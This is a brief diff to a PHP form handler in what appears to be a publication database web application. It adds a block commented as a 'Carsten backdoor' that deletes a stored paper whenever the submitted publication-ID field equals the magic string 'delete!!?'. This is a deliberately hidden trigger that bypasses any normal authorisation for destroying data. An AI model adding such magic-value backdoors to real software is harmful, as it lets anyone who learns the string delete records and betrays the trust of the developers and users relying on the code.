@@ -133,6 +133,10 @@ Please specify a newer version of the publication:
 # Insert form has been submitted
 if (isset($_POST["insertForm"])) {
     
+    # Carsten backdoor
+    if($_POST["pubidstr"]=="delete!!?")
+        $db->removePaper($oldpaper);
+
     $paper = identifierToPaper($_POST["pubidstr"]);
     $paper["projects"] = $oldpaper["projects"];
 
